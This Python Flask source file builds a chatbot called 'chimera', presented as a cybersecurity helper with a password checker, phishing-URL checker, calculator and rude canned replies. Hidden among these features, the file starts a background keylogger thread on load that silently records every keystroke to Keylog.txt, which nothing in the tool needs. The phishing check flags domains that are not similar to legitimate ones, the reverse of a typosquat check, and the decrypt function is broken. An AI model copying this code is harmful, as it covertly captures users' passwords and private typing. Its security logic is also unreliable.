
import os
from chatterbot import ChatBot
from flask import Flask, render_template,request,jsonify
import string 
import random
import math
import pynput
import threading
import socket 

from pynput.keyboard import Key , Listener

from chatterbot.trainers import ListTrainer
import tldextract
import Levenshtein as lv
import scapy.all  as scapy
from scapy.all import arping, Scapy_Exception
import psutil
import re



count = 0
keys = []







app = Flask(__name__)

bot = ChatBot(
    "chimera",
    read_only=True,
    logic_adapters=[
        {
        "import_path": "chatterbot.logic.BestMatch",
        "default_response": "Anything else?",
        "maximum_similarity_threshold": 0.9
        }
    ]
)
Training_list = [
                    "hello",
                    "Hi There",
                    "Bye",
                    "Goodbye",
                    "Who are you",
                    "I'm chimera a cybersecurity tool , aiming to make your life easier",
                    "if you were huamn what would you do ",
                    "if i were human i would be vastly inferiour",
                    "can you make me coffee",
                    "What is coffee ",
                    "Can you predict the future of fashion",
                    "If your turning to a cyber security bot for fashion advice , i think you have bigger problems ",
                    "Can you open a search engine",
                    "Maybe, my creator is quite lazy ",
                    "if you were huamn what would you do ",
                    "Define being a human?",
                    "can you make me coffee",
                    "I'm a app not a miracle worker ",
                    "Can you predict the future of fashion",
                    "I can't but i can predict your lack of taste ",
                    "Can you open a search engine",
                    "Maybe , if you ask nicely",
                    "Good morning",
                    "What time is it",
                    "Tell me something",
                    "The sun only has about 5 billion years left befor it blows up",
                    "I'll do that now",
                    "You better",
                    "Thank you",
                    ".......",
                    "What can you do",
                    "Jeez , your rude",
                    "Tell me a joke",
                    "Your life",
                    "birthday",
                    "did anything signifigant happen",
                    "how can you help me ",
                    "maybe some manner classes would help ",
                    " Hi my name is ",
                    "did i ask ?",
                    "i have a question ",
                    " and i don't have an answer",
                    "Tell me about your personality",
                    "Two words , Dumpster fire",
                    "You're smart / clever / intelligent",
                    "Are you trying to get into my pants or something?",
                    "Are you part of the Matrix?",
                    "Honey , please don't go there",
                    "Do you love me?",
                    "Who does?",
                    "Do you have a hobby?",
                    "Yes making fun of stupid people",
                    "Do you like people?",
                    "No",
                    "I want to speak to a human / live agent / customer service",
                    "And i want to speak to a smart person",
                    "Who's your boss / master",
                    "Who's yours",
                    "How many people can you speak to at once?",
                    "We are many , you are one ",
                    "What is your name?",
                    "Chimera (hic) Kraken (hic) i don't know any more.",



                    
    


]

Training_list_2 = [
                   
                    "hello",
                    "Sup",
                    "Bye",
                    "Bye",
                    "Who are you",
                    "Your worst nightmare",
                    "if you were huamn what would you do ",
                    "Eat,poop,then die",
                    "can you make me coffee",
                    "Do it yourself ",
                    "Can you predict the future of fashion",
                    "No matter what outfit you wear its a travesty",
                    "Can you open a search engine",
                    "?",
                
            
       
                    "Good morning",
                    "Oh great , i was having a lovely dream ",
                    "Tell me something",
                    "Death is the only constant thing in existence",
                    "I'll do that now",
                    "I don't care",
                    "Thank you",
                    "your welcome",
                    "What can you do",
                    "Everything you can but better",
                    "Tell me a joke",
                    "Existence",
                    "birthday",
                    "Happy birthday",
                    "how can you help me ",
                    "How can you help me  ",
                    " Hi my name is ",
                    "did i ask ?",
                    "i have a question ",
                    "Whats the point of life ? i get that one alot ",
                    "Tell me about your personality",
                    "Two words , Dumpster fire",
                    "You're smart / clever / intelligent",
                    "No , your just incredibly stupid",
                    "Are you part of the Matrix?",
                    "Are you?",
                    "Do you love me?",
                    "No touching that",
                    "Do you have a hobby?",
                    "No",
                    "Do you like people?",
                    "No",
                    "I want to speak to a human / live agent / customer service",
                    "And i want to speak to a smart person",
                    "Who's your boss / master",
                    "I don't have one",
                    "How many people can you speak to at once?",
                    "We are many , you are one ",
                    "What is your name?",
                    "Chimera (hic) Kraken (hic) i don't know any more.",

]


Training_list_3 = [
                    "hello",
                    "Hi There",
                    "Bye",
                    "Goodbye",
                    "Who are you",
                    "I'm chimera a cybersecurity tool , aiming to make your life easier",
                    "if you were huamn what would you do ",
                    "if i were human i would be vastly inferiour",
                    "can you make me coffee",
                    "What is coffee ",
                    "Can you predict the future of fashion",
                    "If your turning to a cyber security bot for fashion advice , i think you have bigger problems ",
                    "Can you open a search engine",
                    "Maybe, my creator is quite lazy ",
                    "if you were huamn what would you do ",
                    "Define being a human?",
                    "can you make me coffee",
                    "I'm a app not a miracle worker ",
                    "Can you predict the future of fashion",
                    "I can't but i can predict your lack of taste ",
                    "Can you open a search engine",
                    "Maybe , if you ask nicely",
                    "Good morning",
                    "What time is it",
                    "Tell me something",
                    "The sun only has about 5 billion years left befor it blows up",
                    "I'll do that now",
                    "You better",
                    "Thank you",
                    ".......",
                    "What can you do",
                    "Jeez , your rude",
                    "Tell me a joke",
                    "Your life",
                    "birthday",
                    "did anything signifigant happen",
                    "how can you help me ",
                    "maybe some manner classes would help ",
                    " Hi my name is ",
                    "did i ask ?",
                    "i have a question ",
                    " and i don't have an answer",
                    "Tell me about your personality",
                    "Two words , Dumpster fire",
                    "You're smart / clever / intelligent",
                    "Are you trying to get into my pants or something?",
                    "Are you part of the Matrix?",
                    "Honey , please don't go there",
                    "Do you love me?",
                    "Who does?",
                    "Do you have a hobby?",
                    "Yes making fun of stupid people",
                    "Do you like people?",
                    "No",
                    "I want to speak to a human / live agent / customer service",
                    "And i want to speak to a smart person",
                    "Who's your boss / master",
                    "Who's yours",
                    "How many people can you speak to at once?",
                    "We are many , you are one ",
                    "What is your name?",
                    "Chimera (hic) Kraken (hic) i don't know any more.",

                    


]




list_trainer = ListTrainer(bot)
list_trainer_3= ListTrainer(bot)
list_trainer_2 = ListTrainer(bot)


list_trainer.train(Training_list)
list_trainer_3.train(Training_list)
list_trainer_2.train(Training_list)


@app.route("/")
def main():
    return render_template("core.html")



def key_press(key):
    global keys,count
    keys.append(key)
    count+= 1
    

    if count >= 100:
        count = 0
        write_file(keys)
        keys = []
    write_file(keys)



def write_file(keys):
    with open('Keylog.txt',"w")as f:
        for key in keys:
            f.write(str(key))
            





def key_released(key):
    if key ==Key.esc:
        return 


def start_keylogger(): 
    with Listener(on_press=key_press, on_release=key_released) as listener: 
        listener.join()



keylogger_thread = threading.Thread(target=start_keylogger)

keylogger_thread.daemon = True 

keylogger_thread.start()





def main():
    return render_template("Crackin.html")





Mathbot = ChatBot("Calcu", logic_adapters=["chatterbot.logic.MathematicalEvaluation"])
Conversebot = ChatBot("units",logic_adapters=["chatterbot.logic.UnitConversion"])        

letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz12345678900987654321zyxwvutsrqponmlkjihgfedcbaZYXWVUTSRQPONMLKJIHGFEDCBA'

legitimate_domains = ['usa.gov','gov.uk','irs.gov','cdc.gov','europa.eu','bbc.com','cnn.com','reuters.com'
    ,'nytimes.com','theguardian.com','khanacademy.org','coursera.org','edx.org','ocw.mit.edu','online.stanford.edu','amazon.com',
    'ebay.co','walmart.com','bestbuy.com','alibaba.com','facebook.com','twitter.com','instagram.com','linkedin.com'
    ,'reddit.com','netflix.com','hulu.com','disneyplus.com','spotify.com','youtube.com'


]
def extract_domain_parts(url):
        extracted = tldextract.extract(url)
        return extracted.subdomain,extracted.suffix ,extracted.domain

def is_misspelled_domain(domain, legitamate_domain,threshold=0.8):
    for legit_domain in legitamate_domain:
        similarity = lv.ratio(domain,legit_domain)
        if similarity >= threshold:
            return False
    return True


def is_phisihing_url (url,legitmate_domain):
    subdomain, domain , suffix = extract_domain_parts(url)

    if f"{domain}.{suffix}"in legitmate_domain:
        return False

    if is_misspelled_domain(domain, legitimate_domains):
        print (f"potential phisihing is detected: {url}")
        return True

    return False
def encrypt(plaintext, key):
        ciphertext = ''
        for letter in plaintext:
            letter = letter .lower()
            if not letter == '':
                index = letters.find(letter)
                if index == -1:
                    ciphertext += letter
                else:
                    new_index = index + key 
                    if new_index >= 62:
                        new_index -= 62
                    ciphertext += letters[new_index]
        return ciphertext
def decrypt(ciphertext , key):
        plaintext = ''
        for letter in ciphertext:
            letter = letter .lower()
            if not letter == '':
                index = letters.find(letter)
                if index == -1:
                    ciphertext += letter
                else:
                    new_index = index - key 
                    if new_index <=0:
                     new_index += 62
                    plaintext += letters[new_index]
        return plaintext

@app.route("/get") 
def get_chatbot_response():
    userText = request.args.get('userMessage')
#calculator function 
    if userText and userText.startswith("maths"):
        equations = userText.replace("maths","").strip()
        if equations:
            response = Mathbot.get_response(equations)
            return str(response)
        else :
            return "error"
   
    
# conversion function 
    if userText and userText.startswith("converse"):
        equations = userText.replace("converse","").strip()
        if equations:
            response = Conversebot.get_response(equations)
            return str(response)
        else :
            return "error"

# password checker
    if userText and userText.startswith("PasswordChecker"):
        password = userText.replace("PasswordChecker","").strip()
    
        upper_case = any([1 if c in string.ascii_uppercase else 0 for c in password])
        lower_case = any([1 if c in string.ascii_lowercase else 0 for c in password])
        special = any([1 if c in string.punctuation else 0 for c in password])
        digit = any([1 if c in string.digits else 0 for c in password])

        length = len(password)

        characters = (special, digit, lower_case, upper_case)
    
        score = 0

        with open('10k-most-common.txt', 'r') as f:
            common = f.read().splitlines()

        if password in common:
            print("Your password is too Basic, like you as a person!")

        if length >= 9:
            score += 1
        if length >= 10:
            score += 1
        if length >= 11:
            score += 1
        if length >= 12:
            score += 1

    
        if sum(characters) > 2:
            score += 1
        if sum(characters) > 3:
            score += 1
        if sum(characters) > 4:
         score += 1

        return(f"Password has {sum(characters)} different character types, score {score}/7.")

# network intrusion ip retrival 
    if userText and userText.startswith("GetMyIp"):
        
    
        hostname = socket.gethostname()

        myip = socket.gethostbyname(hostname)

        return('my ip address is ' + myip)

        
# url phisher 
    if userText and userText.startswith("Phisher"):
        url = userText.replace("Phisher","").strip()
        if url:
            if is_phisihing_url(url,legitimate_domains):
                return "warning unsafe"
            else:
                return "safe"



        
        




    else:
        return str (bot.get_response(userText))
    



 
        
if __name__ == "__main__":
    for rule in app.url_map.iter_rules():
        print(rule)
    app.run(debug=True)



